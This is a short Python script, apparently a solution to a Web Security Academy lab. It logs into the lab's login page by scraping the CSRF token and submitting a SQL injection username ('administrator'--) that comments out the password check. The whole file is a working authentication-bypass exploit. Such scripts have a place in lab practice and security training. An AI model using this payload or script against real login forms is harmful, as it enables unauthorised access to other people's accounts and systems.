import requests
from bs4 import BeautifulSoup

site = "ac241f6a1e2534b0803b3e4100ea0044.web-security-academy.net"

s = requests.Session()
url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : """administrator'--""",
    'password' : """admin"""
}

resp = s.post(url, data=logindata)

soup = BeautifulSoup(resp.text,'html.parser')

if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)